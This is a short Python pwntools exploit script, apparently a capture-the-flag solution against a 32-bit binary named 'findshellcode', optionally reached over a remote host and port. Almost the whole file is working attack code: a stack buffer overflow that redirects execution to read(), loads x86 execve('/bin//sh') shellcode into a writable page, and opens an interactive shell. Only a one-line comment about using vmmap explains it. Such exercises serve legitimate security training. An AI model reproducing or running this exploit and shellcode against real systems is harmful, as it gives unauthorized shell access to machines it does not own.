# lessons learned: vmmap to see what part is writable.

import struct
import sys
from pwn import *

def pack(addr):
    return struct.pack('<I', addr)

# prepare buff
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'
read_addr = 0x080480fd
# ret_addr = 0xfffdd000
ret_addr = 0x08049000

buff = '\x90' * 48
buff += pack(read_addr)
buff += pack(ret_addr)     # return addrr
buff += pack(0)              # int fd
buff += pack(ret_addr)     # void *buf
buff += pack(len(shellcode)) # size_t count

if len(sys.argv) >= 3:
    io = remote(sys.argv[1], sys.argv[2])
else:
    io = process('./findshellcode')

io.recv()
io.sendline(buff)
io.sendline(shellcode)
io.interactive()
